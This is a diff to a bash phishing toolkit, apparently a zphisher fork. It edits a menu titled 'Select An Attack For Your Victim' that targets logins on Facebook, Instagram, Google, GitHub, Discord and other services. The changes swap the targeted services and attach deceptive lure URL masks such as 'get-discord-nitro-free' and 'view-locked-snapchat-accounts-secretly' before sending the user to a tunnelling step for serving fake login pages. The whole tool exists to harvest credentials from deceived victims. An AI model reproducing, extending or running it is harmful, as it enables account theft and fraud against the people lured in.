@@ -282,7 +282,7 @@ about() {
 		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/rahul-bhatt43/
 		${GREEN}Version  ${RED}:  ${ORANGE}1
 
-		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapiace
+		${REDBG}${WHITE} Thanks : htr-tech
 							
 
 		${RED}Warning:${WHITE}
@@ -559,16 +559,16 @@ main_menu() {
 	cat <<- EOF
 		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin
-		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
+		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Linkedin
+		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Wordpress
 		${RED}[${WHITE}03${RED}]${ORANGE} Google        
 		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     
 		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       
-		${RED}[${WHITE}33${RED}]${ORANGE} Github        
-		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok         
+		${RED}[${WHITE}06${RED}]${ORANGE} Github        
+		${RED}[${WHITE}07${RED}]${ORANGE} Tiktok         
 		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       
-		${RED}[${WHITE}13${RED}]${ORANGE} Snapchat       
-		${RED}[${WHITE}34${RED}]${ORANGE} Discord
+		${RED}[${WHITE}09${RED}]${ORANGE} Snapchat       
+		${RED}[${WHITE}10${RED}]${ORANGE} Discord
 
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
@@ -592,32 +592,32 @@ main_menu() {
 			mask='http://upgrade-your-netflix-plan-free'
 			tunnel_menu;;
 		6 | 06)
-			website="paypal"
-			mask='http://get-500-usd-free-to-your-acount'
+			website="github"
+			mask='http://get-1k-followers-on-github-free'
 			tunnel_menu;;
 		7 | 07)
-			website="steam"
-			mask='http://steam-500-usd-gift-card-free'
+			website="tiktok"
+			mask='http://tiktok-free-liker'
 			tunnel_menu;;
 		8 | 08)
 			website="twitter"
 			mask='http://get-blue-badge-on-twitter-free'
 			tunnel_menu;;
 		9 | 09)
-			website="playstation"
-			mask='http://playstation-500-usd-gift-card-free'
+			website="snapchat"
+			mask='http://view-locked-snapchat-accounts-secretly'
 			tunnel_menu;;
 		10)
-			website="tiktok"
-			mask='http://tiktok-free-liker'
+			website="discord"
+			mask='http://get-discord-nitro-free'
 			tunnel_menu;;
 		11)
-			website="twitch"
-			mask='http://unlimited-twitch-tv-user-for-free'
+			website="linkedin"
+			mask='http://get-a-premium-plan-for-linkedin-free'
 			tunnel_menu;;
 		12)
-			website="pinterest"
-			mask='http://get-a-premium-plan-for-pinterest-free'
+			website="wordpress"
+			mask='http://unlimited-wordpress-traffic-free'
 			tunnel_menu;;
 		13)
 			website="snapchat"
